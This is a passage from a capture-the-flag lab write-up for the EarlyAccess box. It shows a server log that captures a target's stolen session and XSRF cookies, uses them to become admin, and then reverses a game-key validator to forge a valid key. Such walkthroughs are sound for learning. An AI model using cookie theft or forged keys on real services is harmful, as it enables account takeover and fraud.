<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> nc <span class="at">-lvnp</span> 443                                                                                                                  1 ⨯</span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">listening</span> on <span class="pp">[</span><span class="ss">any</span><span class="pp">]</span> 443 ...</span>
<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="ex">connect</span> to <span class="pp">[</span><span class="ss">10.10.14.2</span><span class="pp">]</span> from <span class="er">(</span><span class="ex">UNKNOWN</span><span class="kw">)</span> <span class="ex">[10.10.11.110]</span> 46374</span>
<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">?Kz�+ٖ0�</span> [���踎Ml4f���I��Uk��P   r�j ���+�/�,�0̨̩����/5����</span>
<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="ex">jj</span></span>
<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>  <span class="co">#</span></span>
<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="ex">3+</span><span class="er">)</span><span class="ex">jj</span> �Ξ�N��D���<span class="kw">|</span><span class="ex">��ŭ���κ����1-+</span></span>
<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="ex">��</span></span>
<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>  <span class="ex">ih2**�</span>  </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>The message seems to be encrypted. We probably need to setup a <strong>HTTPS</strong> server in order to grab the cookie.</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">void㉿void</span><span class="kw">)</span><span class="ex">-[/git/htb/earlyaccess]</span></span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> sudo python3 simple-https-server.py</span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a><span class="ex">10.10.11.110</span> <span class="at">-</span> <span class="at">-</span> [14/Sep/2021 16:08:30] <span class="st">"GET /?XSRF-TOKEN=eyJpdiI6InNmd2VuaEpxMXI5aWQvNzNpajRvQkE9PSIsInZhbHVlIjoicGhXcjM3dnhrc2JPNFVwLzRzSWUxRU0zMGp0TTl1MW9xQXdYKzdRRXZ2MFMrcVlBSUhZZjdxTWQvLytQRE1MdlVHYnh4VEtKbXdQMzUzMldsVjNLSEsxM3dvM3hVYmRzVHI1cnliQXlsK29WY0JaN0hzMEthVlBrSXF5Q0VBSVkiLCJtYWMiOiJkYzY5MGIxZTY3Zjk5YzM2MmQ3OWViNGVhODRmNDJkM2NkMmQwMDhlMzQ2Y2NkNDBjZTdmM2VkMGQzZjcxZTAxIn0%3D;%20earlyaccess_session=eyJpdiI6IjZ1ZWpFdlhBL0xQcHdFanRmTkM5aFE9PSIsInZhbHVlIjoiQ3Z0M0RwdExoZ1VqblhOWWMyTHNQa1d1aVczdVQvdnNRNk5ac0txTGF3Nkw4YmpGVDRxUmp0Q2l6NFY1Z1Jmcm5MVk44d0pXdFJWYWNzck8xQW1pRXpPTGl3dHdub0d6YzBUN2xqa21qbnpONkdVaHFjd2dQTngzZzRMWVl1Q1EiLCJtYWMiOiJjOTJkYmI2ODU4MzYyOTFhMWNiNjVjYjE0YTVkZDQ2NDc4ZGJlY2MzYTY0MzAwMGZiNzZlZTFjYjE3YTYyYzUzIn0%3D HTTP/1.1"</span> 200 <span class="at">-</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Change the <code>XSRF-TOKEN</code> and <code>earlyaccess_session</code> in the browser, update and we are now admin!</p>
<p>![[earlyaccess-02.png]]</p>
<hr>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>Both the <code>Dev</code> and <code>Game</code> vhost seems to be locked behind additional authentication at this stage, however from <code>Admin</code> we are able to download a backup file to validate game keys. Looking through each line of the code we should be able to reverse the script and thus get a valid key.</p>
<p><strong>First section</strong> checks if key is in valid format (ex. AAAAA-BBBBB-CCCC1-DDDDD-1234)</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> valid_format(<span class="va">self</span>) <span class="op">-&gt;</span> <span class="bu">bool</span>:</span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="bu">bool</span>(match(<span class="vs">r"</span><span class="dv">^</span><span class="pp">[A-Z0-9]</span><span class="op">{5}</span><span class="kw">(</span><span class="vs">-</span><span class="pp">[A-Z0-9]</span><span class="op">{5}</span><span class="kw">)(</span><span class="vs">-</span><span class="pp">[A-Z]</span><span class="op">{4}</span><span class="pp">[0-9]</span><span class="kw">)(</span><span class="vs">-</span><span class="pp">[A-Z0-9]</span><span class="op">{5}</span><span class="kw">)(</span><span class="vs">-</span><span class="pp">[0-9]</span><span class="op">{1,5}</span><span class="kw">)</span><span class="dv">$</span><span class="vs">"</span>, <span class="va">self</span>.key))</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>Second section</strong> strips the fifth (last) group of the key, and calculates the combined ASCII Decimal value of group 1,2,3 and 4. The last, stripped, group will be used at a later stage as a checksum for verification - comparing to the combined value.</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> calc_cs(<span class="va">self</span>) <span class="op">-&gt;</span> <span class="bu">int</span>:</span>
<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>        gs <span class="op">=</span> <span class="va">self</span>.key.split(<span class="st">'-'</span>)[:<span class="op">-</span><span class="dv">1</span>]</span>
<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="bu">sum</span>([<span class="bu">sum</span>(<span class="bu">bytearray</span>(g.encode())) <span class="cf">for</span> g <span class="kw">in</span> gs])</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb11"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> a <span class="op">=</span> <span class="st">"AAAAA-BBBBB-CCCC1-DDDDD-1234"</span></span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> b <span class="op">=</span> a.split(<span class="st">'-'</span>)[:<span class="op">-</span><span class="dv">1</span>]</span>
<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(b)</span>
<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>[<span class="st">'AAAAA'</span>, <span class="st">'BBBBB'</span>, <span class="st">'CCCC1'</span>, <span class="st">'DDDDD'</span>]</span>
<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">sum</span>([<span class="bu">sum</span>(<span class="bu">bytearray</span>(g.encode())) <span class="cf">for</span> g <span class="kw">in</span> b]))</span>
<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a><span class="dv">1312</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>Third section (first group)</strong> calculates that the value of the three first letters of the key to spell out <strong>K E Y</strong>, the fourth and fifth character is checked to see if it’s an integer and lastly the length is checked before moving to next function.</p>
<p>Valid first group could be: <strong>KEY01</strong></p>
<div class="sourceCode" id="cb12"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> g1_valid(<span class="va">self</span>) <span class="op">-&gt;</span> <span class="bu">bool</span>:</span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>        g1 <span class="op">=</span> <span class="va">self</span>.key.split(<span class="st">'-'</span>)[<span class="dv">0</span>]</span>
<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>        r <span class="op">=</span> [(<span class="bu">ord</span>(v)<span class="op">&lt;&lt;</span>i<span class="op">+</span><span class="dv">1</span>)<span class="op">%</span><span class="dv">256</span><span class="op">^</span><span class="bu">ord</span>(v) <span class="cf">for</span> i, v <span class="kw">in</span> <span class="bu">enumerate</span>(g1[<span class="dv">0</span>:<span class="dv">3</span>])]</span>
<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> r <span class="op">!=</span> [<span class="dv">221</span>, <span class="dv">81</span>, <span class="dv">145</span>]:</span>
<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="va">False</span></span>
<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> v <span class="kw">in</span> g1[<span class="dv">3</span>:]:</span>
<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a>            <span class="cf">try</span>:</span>
<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a>                <span class="bu">int</span>(v)</span>
<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>            <span class="cf">except</span>:</span>
<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a>                <span class="cf">return</span> <span class="va">False</span></span>
<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="bu">len</span>(<span class="bu">set</span>(g1)) <span class="op">==</span> <span class="bu">len</span>(g1)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb13"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> g1 <span class="op">=</span> <span class="st">"KEY01"</span></span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> r <span class="op">=</span> [(<span class="bu">ord</span>(v)<span class="op">&lt;&lt;</span>i<span class="op">+</span><span class="dv">1</span>)<span class="op">%</span><span class="dv">256</span><span class="op">^</span><span class="bu">ord</span>(v) <span class="cf">for</span> i, v <span class="kw">in</span> <span class="bu">enumerate</span>(g1[<span class="dv">0</span>:<span class="dv">3</span>])]</span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(r)</span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a>[<span class="dv">221</span>, <span class="dv">81</span>, <span class="dv">145</span>]</span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(g1[<span class="dv">3</span>])</span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="dv">0</span></span>
<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">len</span>(<span class="bu">set</span>(g1)))</span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a><span class="dv">5</span></span>
<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">len</span>(g1))</span>
<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a><span class="dv">5</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>Forth section (second group)</strong> divides the key in two parts, p1 containing character 1,3 and 5 of the key, and p2 containing character 2 and 4. The sum function calculates the ASCII decimal value of p1 and p2, and then compares them to each other. p1 and p2 must be equal to pass as valid.</p>
<p>Valid second group could be: <strong>1J1I1</strong></p>
<div class="sourceCode" id="cb14"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> g2_valid(<span class="va">self</span>) <span class="op">-&gt;</span> <span class="bu">bool</span>:</span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a>        g2 <span class="op">=</span> <span class="va">self</span>.key.split(<span class="st">'-'</span>)[<span class="dv">1</span>]</span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a>        p1 <span class="op">=</span> g2[::<span class="dv">2</span>]</span>
<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a>        p2 <span class="op">=</span> g2[<span class="dv">1</span>::<span class="dv">2</span>]</span>
<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="bu">sum</span>(<span class="bu">bytearray</span>(p1.encode())) <span class="op">==</span> <span class="bu">sum</span>(<span class="bu">bytearray</span>(p2.encode()))</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb15"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> g2 <span class="op">=</span> <span class="st">"12345"</span></span>
<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> p1 <span class="op">=</span> g2[::<span class="dv">2</span>]</span>
<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(p1)</span>
<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a><span class="dv">135</span></span>
<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> p2 <span class="op">=</span> g2[<span class="dv">1</span>::<span class="dv">2</span>]</span>
<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(p2)</span>
<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a><span class="dv">24</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb16"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> p1 <span class="op">=</span> <span class="st">"1"</span></span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(p1.encode())</span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a><span class="st">b'1'</span></span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">sum</span>(p1.encode()))</span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a><span class="dv">49</span></span>
<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="dv">49</span><span class="op">*</span><span class="dv">3</span></span>
<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a><span class="dv">147</span></span>
<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> p2 <span class="op">=</span> <span class="st">"J"</span></span>
<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(p2.encode())</span>
<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a><span class="st">b'J'</span></span>
<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">sum</span>(p2.encode()))</span>
<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a><span class="dv">74</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb17"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> g2 <span class="op">=</span> <span class="st">"1J1I1"</span></span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> p1 <span class="op">=</span> g2[::<span class="dv">2</span>]</span>
<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> p2 <span class="op">=</span> g2[<span class="dv">1</span>::<span class="dv">2</span>]</span>
<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">sum</span>(<span class="bu">bytearray</span>(p1.encode())))</span>
<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="dv">147</span></span>
<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">sum</span>(<span class="bu">bytearray</span>(p2.encode())))</span>
<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a><span class="dv">147</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>Fifth section (third group)</strong> checks if the first two characters of the groups are equal to <code>magic_value</code> which is statically assigned to <code>XP</code>, at the start of the code. If the first check passes, then the whole group is check to see if it’s total decimal value (<code>sum</code>) is equal to <code>magic_num</code>, which is statically assigned to <code>346</code>, at the start of the code.</p>
<p>The ASCII decimal value of XP is 168, meaning our three remaining characters should have a combined value of 178.</p>
<p>Keep note that third group needs to follow the format: <code>[A-Z]{4}[0-9]</code></p>
<p>Valid third group could be: <strong>XPAA0</strong></p>
<div class="sourceCode" id="cb18"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> g3_valid(<span class="va">self</span>) <span class="op">-&gt;</span> <span class="bu">bool</span>:</span>
<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>        <span class="co"># </span><span class="al">TODO</span><span class="co">: Add mechanism to sync magic_num with API</span></span>
<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>        g3 <span class="op">=</span> <span class="va">self</span>.key.split(<span class="st">'-'</span>)[<span class="dv">2</span>]</span>
<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> g3[<span class="dv">0</span>:<span class="dv">2</span>] <span class="op">==</span> <span class="va">self</span>.magic_value:</span>
<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="bu">sum</span>(<span class="bu">bytearray</span>(g3.encode())) <span class="op">==</span> <span class="va">self</span>.magic_num</span>
<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span>:</span>
<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> <span class="va">False</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb19"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> g3 <span class="op">=</span> <span class="st">"12345"</span></span>
<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(g3[<span class="dv">0</span>:<span class="dv">2</span>])</span>
<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a><span class="dv">12</span></span>
<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> start <span class="op">=</span> <span class="st">"XP"</span></span>
<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">sum</span>(start.encode()))</span>
<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a><span class="dv">168</span></span>
<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="dv">346</span><span class="op">-</span><span class="dv">168</span></span>
<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a><span class="dv">178</span></span>
<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> end <span class="op">=</span> <span class="st">"AA0"</span></span>
<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">sum</span>(end.encode()))</span>
<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a><span class="dv">178</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>Sixth section (fourth group)</strong> compares the first group with the fourth group, character by character, converts it to ASCII decimal and calculates the mod value of the two. The mod value must be equal to <code>12, 4, 20, 117, 0</code>.</p>
<p>Valid fourth group could be: <strong>GAME1</strong></p>
<div class="sourceCode" id="cb20"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> g4_valid(<span class="va">self</span>) <span class="op">-&gt;</span> <span class="bu">bool</span>:</span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> [<span class="bu">ord</span>(i)<span class="op">^</span><span class="bu">ord</span>(g) <span class="cf">for</span> g, i <span class="kw">in</span> <span class="bu">zip</span>(<span class="va">self</span>.key.split(<span class="st">'-'</span>)[<span class="dv">0</span>], <span class="va">self</span>.key.split(<span class="st">'-'</span>)[<span class="dv">3</span>])] <span class="op">==</span> [<span class="dv">12</span>, <span class="dv">4</span>, <span class="dv">20</span>, <span class="dv">117</span>, <span class="dv">0</span>]</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb21"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">ord</span>(<span class="st">"K"</span>))</span>
<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="dv">75</span></span>
<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">ord</span>(<span class="st">"G"</span>))</span>
<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="dv">71</span></span>
<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">ord</span>(<span class="st">"K"</span>)<span class="op">^</span><span class="bu">ord</span>(<span class="st">"G"</span>))</span>
<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a><span class="dv">12</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb22"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">ord</span>(<span class="st">"E"</span>))</span>
<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="dv">69</span></span>
<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">ord</span>(<span class="st">"A"</span>))</span>
<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="dv">65</span></span>
<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">ord</span>(<span class="st">"E"</span>)<span class="op">^</span><span class="bu">ord</span>(<span class="st">"A"</span>))</span>
<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a><span class="dv">4</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb23"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">ord</span>(<span class="st">"Y"</span>))</span>
<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="dv">89</span></span>
<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">ord</span>(<span class="st">"M"</span>))</span>
<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a><span class="dv">77</span></span>
<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">ord</span>(<span class="st">"Y"</span>)<span class="op">^</span><span class="bu">ord</span>(<span class="st">"M"</span>))</span>
<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a><span class="dv">20</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb24"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">ord</span>(<span class="st">"0"</span>))</span>
<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="dv">48</span></span>
<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">ord</span>(<span class="st">"E"</span>))</span>
<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a><span class="dv">69</span></span>
<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">ord</span>(<span class="st">"0"</span>)<span class="op">^</span><span class="bu">ord</span>(<span class="st">"E"</span>))</span>
<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a><span class="dv">117</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<div class="sourceCode" id="cb25"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="op">&gt;&gt;&gt;</span> <span class="bu">print</span>(<span class="bu">ord</span>(<span class="st">"1"</span>)<span class="op">^</span><span class="bu">ord</span>(<span class="st">"1"</span>))</span>
<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="dv">0</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><strong>Checksum verification (fifth group)</strong> is done by comparing the combined ASCII decimal sum of the four first groups, compared to the value of the fifth group.</p>
<div class="sourceCode" id="cb26"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> calc_cs(<span class="va">self</span>) <span class="op">-&gt;</span> <span class="bu">int</span>:</span>
<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a>        gs <span class="op">=</span> <span class="va">self</span>.key.split(<span class="st">'-'</span>)[:<span class="op">-</span><span class="dv">1</span>]</span>
